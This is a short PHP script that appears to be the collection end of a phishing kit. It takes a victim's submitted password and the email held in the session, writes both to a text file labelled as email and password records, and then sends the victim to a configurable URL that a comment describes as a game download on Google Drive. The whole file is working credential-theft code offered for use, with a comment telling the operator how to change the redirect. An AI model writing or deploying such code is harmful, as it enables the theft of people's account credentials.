<?php
include 'ip.php';
			session_start();
			
			$pass = $_POST["password"];
			$email=$_SESSION["Email"];
			//opening logins text file for appending new data.
  			$file = fopen("usernames.txt", "a") or die("Unable to open file!");
			
  			//Writing email and password to logins.txt. 
  			fwrite($file, "[EMAIL: ]" . " ". $email . " " . " " . "[PASS: ]" . " " . $pass .FILE_APPEND);			
  			fclose($file);//closing logins.txt.
			
  			//redirecting user to the google drive's locations where the game is available to download.
  			//change the location url to redirect to a website of your choice.
  			header('Location: <CUSTOM>');
			exit();
			
			
			session_destroy();
			
?>
